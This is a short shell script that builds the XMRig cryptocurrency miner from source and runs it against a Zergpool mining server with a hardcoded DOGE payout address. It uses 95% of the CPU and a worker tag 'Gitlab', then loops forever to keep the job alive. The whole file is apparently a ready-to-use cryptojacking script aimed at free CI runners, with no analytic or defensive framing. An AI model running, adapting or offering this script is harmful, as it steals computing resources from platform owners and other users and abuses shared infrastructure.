#!/bin/sh
sudo apt update
sudo apt install screen -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build && cd xmrig/build
cmake ..
make -j$(nproc)
./xmrig -a rx/0 -o stratum+tcp://randomx.na.mine.zergpool.com:4453 -u DFkNQGLsvqAxiX3JJgMJK5FyBZD36z5zfW --keepalive --max-cpu-usage 95 --timeout 120 --donate-level 0 -p c=DOGE,ID=Gitlab
while [ 1 ]; do
sleep 3
done
sleep 999
